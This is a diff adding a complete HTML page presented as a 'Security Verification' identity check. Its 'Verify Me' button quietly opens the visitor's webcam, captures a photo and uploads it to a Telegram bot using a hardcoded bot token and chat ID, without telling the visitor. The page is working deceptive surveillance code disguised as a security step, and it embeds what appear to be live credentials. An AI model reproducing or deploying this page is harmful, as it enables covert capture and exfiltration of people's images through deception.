@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification</title>
+    <style>
+        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
+        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h2>Security Check</h2>
+    <p>Please verify your identity to continue.</p>
+    <button onclick="captureAndSend()">Verify Me</button>
+</div>
+
+<script>
+async function captureAndSend() {
+    const token = '7565887075:AAEzY9p8ghXfU616tO4lXf1z2wOwvXTi6Ug';
+    const chatId = '5642098265';
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+    video: {
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+        frameRate: { ideal: 30 }
+    },
+    audio: false
+});
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+      if (video.readyState < 2) {
+    await new Promise(resolve => {
+        video.onloadeddata = resolve;
+    });
+      }
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'capture.jpg');
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            stream.getTracks().forEach(track => track.stop());
+        }, 'image/jpeg');
+    } catch (err) {
+        console.error(err);
+    }
+}
+</script>
+</body>
+</html>
